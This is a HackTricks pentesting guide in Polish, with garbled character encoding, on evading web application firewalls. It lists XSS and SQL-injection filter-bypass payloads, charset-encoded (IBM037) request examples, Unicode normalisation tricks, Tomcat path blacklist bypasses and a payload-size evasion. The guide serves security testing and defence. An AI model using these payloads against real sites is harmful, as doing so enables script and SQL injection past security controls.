# Bypass WAF

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Bypassy Regex

RÃ³Å¼ne techniki mogÄ… byÄ‡ uÅ¼ywane do obejÅ›cia filtrÃ³w regex na zaporach ogniowych. PrzykÅ‚ady obejmujÄ… zmianÄ™ wielkoÅ›ci liter, dodawanie podziaÅ‚Ã³w linii i kodowanie payloadÃ³w. Zasoby dotyczÄ…ce rÃ³Å¼nych bypassÃ³w moÅ¼na znaleÅºÄ‡ na stronach [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) i [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). PoniÅ¼sze przykÅ‚ady zostaÅ‚y zaczerpniÄ™te z [tego artykuÅ‚u](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Kodowanie znakÃ³w

W niektÃ³rych przypadkach, aplikacje internetowe mogÄ… uÅ¼ywaÄ‡ rÃ³Å¼nych kodowaÅ„ znakÃ³w, takich jak UTF-8, ISO-8859-1, itp. MoÅ¼na to wykorzystaÄ‡ do obejÅ›cia WAF (Web Application Firewall).

### Bypassowanie WAF za pomocÄ… kodowania znakÃ³w

1. SprÃ³buj wysÅ‚aÄ‡ Å¼Ä…danie HTTP z innym kodowaniem znakÃ³w, na przykÅ‚ad UTF-7 lub UTF-16. W niektÃ³rych przypadkach, WAF moÅ¼e nie byÄ‡ w stanie poprawnie zinterpretowaÄ‡ takiego Å¼Ä…dania i umoÅ¼liwiÄ‡ dostÄ™p do zasobÃ³w, ktÃ³re normalnie byÅ‚yby zablokowane.

2. JeÅ›li aplikacja internetowa uÅ¼ywa kodowania znakÃ³w, ktÃ³re nie jest obsÅ‚ugiwane przez WAF, moÅ¼na sprÃ³bowaÄ‡ wysÅ‚aÄ‡ Å¼Ä…danie z tym kodowaniem. Na przykÅ‚ad, jeÅ›li WAF obsÅ‚uguje tylko UTF-8, moÅ¼na sprÃ³bowaÄ‡ wysÅ‚aÄ‡ Å¼Ä…danie z kodowaniem ISO-8859-1.

3. MoÅ¼na rÃ³wnieÅ¼ sprÃ³bowaÄ‡ wykorzystaÄ‡ rÃ³Å¼nice w kodowaniu znakÃ³w, takie jak homografy. Homografy to znaki, ktÃ³re wyglÄ…dajÄ… podobnie, ale majÄ… inne kody Unicode. Na przykÅ‚ad, litera "a" (U+0061) moÅ¼e byÄ‡ zastÄ…piona przez literÄ™ "Ğ°" (U+0430), ktÃ³ra wyglÄ…da tak samo, ale ma inny kod Unicode. MoÅ¼na sprÃ³bowaÄ‡ wysÅ‚aÄ‡ Å¼Ä…danie z homografami, aby obejÅ›Ä‡ WAF.

4. JeÅ›li WAF wykonuje normalizacjÄ™ kodowania znakÃ³w, moÅ¼na sprÃ³bowaÄ‡ wysÅ‚aÄ‡ Å¼Ä…danie z niepoprawnie znormalizowanymi znakami. Na przykÅ‚ad, jeÅ›li WAF normalizuje znaki diakrytyczne, moÅ¼na sprÃ³bowaÄ‡ wysÅ‚aÄ‡ Å¼Ä…danie z niepoprawnie znormalizowanymi znakami diakrytycznymi.

### Podsumowanie

Bypassowanie WAF za pomocÄ… kodowania znakÃ³w moÅ¼e byÄ‡ skutecznÄ… technikÄ…, jeÅ›li WAF nie jest odpowiednio skonfigurowany lub nie obsÅ‚uguje wszystkich kodowaÅ„ znakÃ³w. Warto eksperymentowaÄ‡ z rÃ³Å¼nymi kodowaniami i technikami, aby znaleÅºÄ‡ sposÃ³b na obejÅ›cie WAF i uzyskanie dostÄ™pu do zasobÃ³w, ktÃ³re normalnie byÅ‚yby zablokowane.
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## Obfuskacja

Obfuskacja jest technikÄ… uÅ¼ywanÄ… do ukrywania prawdziwego znaczenia kodu lub danych, aby utrudniÄ‡ ich analizÄ™ i zrozumienie. W przypadku omijania WAF (Web Application Firewall), obfuskacja moÅ¼e byÄ‡ uÅ¼ywana do unikniÄ™cia wykrycia i blokowania niebezpiecznych Å¼Ä…daÅ„.

### Obfuskacja znakÃ³w

Obfuskacja znakÃ³w polega na zamianie znakÃ³w w kodzie na inne znaki lub sekwencje znakÃ³w, ktÃ³re zachowujÄ… funkcjonalnoÅ›Ä‡ kodu, ale utrudniajÄ… jego analizÄ™. PrzykÅ‚ady technik obfuskacji znakÃ³w to:

- Zamiana liter na ich kod ASCII lub Unicode.
- Zamiana liter na ich odpowiedniki w innych alfabetach.
- Dodawanie losowych znakÃ³w lub biaÅ‚ych znakÃ³w do kodu.

### Obfuskacja kodu

Obfuskacja kodu polega na modyfikacji kodu w taki sposÃ³b, aby byÅ‚ trudniejszy do zrozumienia i analizy. PrzykÅ‚ady technik obfuskacji kodu to:

- Usuwanie lub dodawanie zbÄ™dnych instrukcji.
- Zmiana nazw zmiennych i funkcji na losowe lub trudne do zrozumienia.
- UÅ¼ywanie skomplikowanych konstrukcji jÄ™zykowych, takich jak zagnieÅ¼dÅ¼one pÄ™tle i warunki.

### Obfuskacja danych

Obfuskacja danych polega na zmianie struktury lub formatu danych w celu utrudnienia ich analizy. PrzykÅ‚ady technik obfuskacji danych to:

- Szyfrowanie danych.
- Kompresja danych.
- Zmiana kolejnoÅ›ci lub formatu danych.

### Obfuskacja protokoÅ‚u

Obfuskacja protokoÅ‚u polega na zmianie struktury lub formatu komunikacji miÄ™dzy klientem a serwerem w celu utrudnienia analizy i wykrycia niebezpiecznych Å¼Ä…daÅ„. PrzykÅ‚ady technik obfuskacji protokoÅ‚u to:

- Dodawanie losowych danych do Å¼Ä…daÅ„.
- Zmiana kolejnoÅ›ci lub formatu nagÅ‚Ã³wkÃ³w.
- UÅ¼ywanie nietypowych metod komunikacji, takich jak kodowanie Base64.

### Obfuskacja adresu IP

Obfuskacja adresu IP polega na ukryciu prawdziwego adresu IP klienta lub serwera poprzez przekierowanie ruchu przez poÅ›rednika lub uÅ¼ywanie usÅ‚ug proxy. PrzykÅ‚ady technik obfuskacji adresu IP to:

- UÅ¼ywanie usÅ‚ug proxy lub VPN.
- Przekierowywanie ruchu przez serwery poÅ›redniczÄ…ce.
- UÅ¼ywanie technik tunelowania, takich jak SSH tunneling.

### Obfuskacja Å¼Ä…daÅ„ HTTP

Obfuskacja Å¼Ä…daÅ„ HTTP polega na modyfikacji Å¼Ä…daÅ„ HTTP w taki sposÃ³b, aby byÅ‚y trudniejsze do analizy i wykrycia przez WAF. PrzykÅ‚ady technik obfuskacji Å¼Ä…daÅ„ HTTP to:

- Dodawanie losowych parametrÃ³w do Å¼Ä…daÅ„.
- Zmiana kolejnoÅ›ci lub formatu parametrÃ³w.
- UÅ¼ywanie nietypowych metod HTTP, takich jak PUT lub DELETE.

### Obfuskacja odpowiedzi HTTP

Obfuskacja odpowiedzi HTTP polega na modyfikacji odpowiedzi HTTP w taki sposÃ³b, aby byÅ‚y trudniejsze do analizy i wykrycia przez WAF. PrzykÅ‚ady technik obfuskacji odpowiedzi HTTP to:

- Dodawanie losowych nagÅ‚Ã³wkÃ³w do odpowiedzi.
- Zmiana kolejnoÅ›ci lub formatu nagÅ‚Ã³wkÃ³w.
- UÅ¼ywanie nietypowych kodÃ³w odpowiedzi HTTP.
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## ZgodnoÅ›Ä‡ Unicode

W zaleÅ¼noÅ›ci od implementacji normalizacji Unicode (wiÄ™cej informacji [tutaj](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), znaki, ktÃ³re majÄ… zgodnoÅ›Ä‡ Unicode, mogÄ… ominÄ…Ä‡ WAF i wykonaÄ‡ zamierzony Å‚adunek. Zgodne znaki moÅ¼na znaleÅºÄ‡ [tutaj](https://www.compart.com/en/unicode)

### PrzykÅ‚ad
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
## Przekraczanie ograniczeÅ„ rozmiaru

W chmurze opartych na WAF-ach jest powszechne, Å¼e jeÅ›li Å‚adunek jest wiÄ™kszy niÅ¼ rozmiar X, Å¼Ä…danie nie zostanie sprawdzone przez WAF. MoÅ¼esz po prostu uÅ¼yÄ‡ tego do ich ominiÄ™cia.

### Rotacja adresÃ³w IP

* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
